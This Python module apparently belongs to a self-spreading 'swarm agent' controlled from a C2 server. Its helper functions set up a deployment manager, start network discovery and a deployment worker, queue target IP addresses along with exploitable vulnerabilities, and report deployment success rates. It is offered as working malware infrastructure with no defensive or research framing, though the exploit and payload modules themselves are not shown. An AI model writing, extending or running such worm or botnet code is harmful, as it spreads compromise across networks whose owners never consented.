"""
DEPLOYMENT HELPER MODULE

Helper functions for deployment integration with autonomous swarm agent
"""

import logging
from typing import Optional, Dict, List
from datetime import datetime

try:
    from agent.deployment_manager import DeploymentManager, DeploymentTarget
    DEPLOYMENT_AVAILABLE = True
except ImportError:
    DEPLOYMENT_AVAILABLE = False

try:
    from agent.auto_configurator import AutoConfigurator
    AUTO_CONFIG_AVAILABLE = True
except ImportError:
    AUTO_CONFIG_AVAILABLE = False

logger = logging.getLogger(__name__)


def initialize_deployment(agent, c2_server: str, c2_port: int = 8443) -> Optional[DeploymentManager]:
    """
    Initialize deployment manager for an agent
    
    Args:
        agent: SwarmAgent instance
        c2_server: C2 server address
        c2_port: C2 server port
        
    Returns:
        DeploymentManager instance or None
    """
    if not DEPLOYMENT_AVAILABLE:
        logger.warning(f"[{agent.agent_id}] Deployment manager not available")
        return None
    
    try:
        deployment_manager = DeploymentManager(
            agent_id=agent.agent_id,
            c2_server=c2_server,
            c2_port=c2_port
        )
        
        # Create deployment packages
        deployment_manager.create_deployment_packages()
        
        # Start deployment worker
        deployment_manager.start_deployment_worker()
        
        # Start network discovery
        deployment_manager.start_network_discovery()
        
        logger.info(f"[{agent.agent_id}] ✅ Deployment manager initialized")
        return deployment_manager
        
    except Exception as e:
        logger.error(f"[{agent.agent_id}] Failed to initialize deployment manager: {e}")
        return None


def configure_agent(agent, c2_server: str, c2_port: int) -> bool:
    """
    Auto-configure agent for optimal operation
    
    Args:
        agent: SwarmAgent instance
        c2_server: C2 server address
        c2_port: C2 server port
        
    Returns:
        bool: True if successful, False otherwise
    """
    if not AUTO_CONFIG_AVAILABLE:
        logger.warning(f"[{agent.agent_id}] Auto configurator not available")
        return False
    
    try:
        configurator = AutoConfigurator()
        config = configurator.auto_configure(
            agent_id=agent.agent_id,
            c2_server=c2_server,
            c2_port=c2_port
        )
        
        logger.info(f"[{agent.agent_id}] ✅ Agent auto-configured")
        return True
        
    except Exception as e:
        logger.error(f"[{agent.agent_id}] Failed to configure agent: {e}")
        return False


def queue_deployment_target(deployment_manager, ip_address: str, port: int, 
                           platform: str = None, vulnerability: str = None) -> bool:
    """
    Queue a target for deployment
    
    Args:
        deployment_manager: DeploymentManager instance
        ip_address: Target IP address
        port: Target port
        platform: Target platform (optional)
        vulnerability: Discovered vulnerability (optional)
        
    Returns:
        bool: True if queued successfully, False otherwise
    """
    if not deployment_manager:
        logger.warning("Deployment manager not available")
        return False
    
    try:
        target = DeploymentTarget(
            ip_address=ip_address,
            port=port,
            platform=platform,
            vulnerability=vulnerability,
            deployment_status="pending"
        )
        
        deployment_manager.queue_deployment(target)
        return True
        
    except Exception as e:
        logger.error(f"Failed to queue deployment target: {e}")
        return False


def get_deployment_statistics(deployment_manager) -> Optional[Dict]:
    """
    Get deployment statistics
    
    Args:
        deployment_manager: DeploymentManager instance
        
    Returns:
        Dictionary of deployment statistics or None
    """
    if not deployment_manager:
        return None
    
    try:
        return deployment_manager.get_deployment_stats()
    except Exception as e:
        logger.error(f"Failed to get deployment statistics: {e}")
        return None


def check_deployment_status(deployment_manager, target_ip: str) -> Optional[str]:
    """
    Check deployment status for a specific target
    
    Args:
        deployment_manager: DeploymentManager instance
        target_ip: Target IP address
        
    Returns:
        Deployment status or None
    """
    if not deployment_manager:
        return None
    
    try:
        for record in deployment_manager.deployments_history:
            if record['target_ip'] == target_ip:
                return record['status']
        return None
    except Exception as e:
        logger.error(f"Failed to check deployment status: {e}")
        return None


def get_successful_deployments(deployment_manager) -> List[Dict]:
    """
    Get list of successful deployments
    
    Args:
        deployment_manager: DeploymentManager instance
        
    Returns:
        List of successful deployment records
    """
    if not deployment_manager:
        return []
    
    try:
        return [
            record for record in deployment_manager.deployments_history
            if record.get('status') == 'successful'
        ]
    except Exception as e:
        logger.error(f"Failed to get successful deployments: {e}")
        return []


def get_total_deployments(deployment_manager) -> Dict:
    """
    Get total deployment count and success rate
    
    Args:
        deployment_manager: DeploymentManager instance
        
    Returns:
        Dictionary with deployment counts
    """
    if not deployment_manager:
        return {'total': 0, 'successful': 0, 'failed': 0, 'success_rate': 0.0}
    
    try:
        stats = deployment_manager.get_deployment_stats()
        
        total = stats['stats']['deployments_attempted']
        successful = stats['stats']['deployments_successful']
        failed = stats['stats']['deployments_failed']
        
        success_rate = (successful / total * 100) if total > 0 else 0.0
        
        return {
            'total': total,
            'successful': successful,
            'failed': failed,
            'success_rate': round(success_rate, 2)
        }
    except Exception as e:
        logger.error(f"Failed to get total deployments: {e}")
        return {'total': 0, 'successful': 0, 'failed': 0, 'success_rate': 0.0}